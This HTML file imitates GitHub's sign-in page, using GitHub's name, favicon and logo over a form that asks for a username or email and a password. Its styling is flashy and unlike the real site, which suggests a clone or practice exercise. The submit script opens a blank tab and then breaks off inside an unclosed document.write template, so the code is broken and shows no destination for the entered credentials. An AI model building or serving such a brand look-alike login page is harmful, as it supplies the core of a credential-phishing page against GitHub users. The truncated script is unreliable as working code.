
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to GitHub · GitHub</title>

<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">

<style>

@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Bungee&display=swap');

body{
margin:0;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Poppins', sans-serif;
text-align:center;

background: linear-gradient(-45deg,#6aa9ff,#1b4f91,#001f3f,#3b82f6);
background-size:400% 400%;
animation: gradientMove 12s ease infinite;
}

@keyframes gradientMove{
0%{background-position:0% 50%}
50%{background-position:100% 50%}
100%{background-position:0% 50%}
}

.container{
background:white;
padding:60px;
border-radius:20px;
width:70%;
max-width:420px;
box-shadow:0 20px 50px rgba(0,0,0,0.35);

animation: float 4s ease-in-out infinite;
}

@keyframes float{
0%{transform:translateY(0px)}
50%{transform:translateY(-8px)}
100%{transform:translateY(0px)}
}

.logo{
width:80px;
margin-bottom:15px;
animation: bounce 3s infinite;
}

@keyframes bounce{
0%{transform:translateY(0)}
50%{transform:translateY(-10px)}
100%{transform:translateY(0)}
}

h2{
font-family:'Bungee', sans-serif;
margin-bottom:25px;
letter-spacing:2px;
color:#0b2f5e;
}

/* input styling */

input{
width:100%;
padding:13px;
border-radius:8px;
border:1px solid #ccc;
margin-bottom:18px;
font-size:14px;
transition:0.3s;
}

/* placeholder style */

input::placeholder{
color:#888;
font-size:13px;
transition:0.3s;
}

/* placeholder fade on focus */

input:focus::placeholder{
opacity:0.4;
transform:translateX(5px);
}

/* glowing focus */

input:focus{
outline:none;
border-color:#3b82f6;
box-shadow:0 0 10px rgba(59,130,246,0.6);
transform:scale(1.02);
}

.link{
display:inline-block;
margin-top:10px;
background:linear-gradient(135deg,#3b82f6,#1d4ed8);
color:white;
padding:14px 28px;
border-radius:12px;
font-weight:500;
border:none;
cursor:pointer;
font-size:15px;
transition:0.3s;
}

.link:hover{
transform:translateY(-3px);
box-shadow:0 8px 25px rgba(0,0,0,0.3);
}

</style>

</head>

<body>

<div class="container">

<img class="logo" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">

<h2>Sign in to GitHub</h2>

<form id="loginForm">

<input type="text" placeholder="Username or email address" required>

<input type="password" placeholder="Password" required>

<button class="link" type="submit">Sign in</button>

</form>

</div>

<script>

document.getElementById("loginForm").addEventListener("submit",function(e){

e.preventDefault();

let tab = window.open("", "_blank");

tab.document.write(`

});

</script>

</body>

</html>
